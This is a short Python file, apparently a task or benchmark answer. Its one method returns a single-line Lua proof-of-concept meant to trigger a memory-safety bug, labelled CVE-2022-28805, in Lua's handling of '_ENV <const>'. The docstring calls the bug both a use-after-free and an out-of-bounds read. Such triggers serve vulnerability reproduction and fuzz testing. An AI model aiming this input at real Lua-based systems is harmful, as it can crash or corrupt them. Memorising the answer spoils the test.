import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in Lua
        related to _ENV <const> declaration (CVE-2022-28805).
        
        The vulnerability is caused by incorrect code generation where the compiler
        emits OP_SETTABUP for a local _ENV variable, leading to an out-of-bounds
        access on the closure's upvalues array (which is empty).
        """
        return b"local function f() local _ENV <const> = 1; A = 1 end; f()"
